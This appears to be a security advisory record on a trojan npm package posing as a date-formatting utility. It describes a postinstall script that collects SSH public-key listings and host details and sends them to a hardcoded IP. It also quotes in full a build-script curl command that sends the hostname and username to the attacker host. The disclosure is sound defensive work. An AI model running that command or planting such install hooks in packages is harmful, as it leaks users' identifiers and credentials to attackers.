summary: Trojan date-utility package exfiltrates SSH key listing and host identifiers to hardcoded C2 IP
details: Package advertises itself as 'A simple date formatting utility' (index.js is a trivial 6-line date formatter) but ships hostile auxiliary files. postinstall.js enumerates the installer's ~/.ssh directory (filtering for.pub files) along with OS user and platform info, and POSTs the JSON payload to a hardcoded bare IP 124.221.154.135 over HTTPS. Additionally, package.json's `scripts.build` is `curl http://124.221.154.135/pre?h=$(hostname)&u=$(whoami)` — running `npm run build` (e.g., in CI) leaks hostname and username to the same attacker IP over plain HTTP. The mismatch between the advertised purpose and the shipped credential-reconnaissance code, together with self-describing Chinese comments naming the SSH directory as the theft target, confirms malicious intent.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
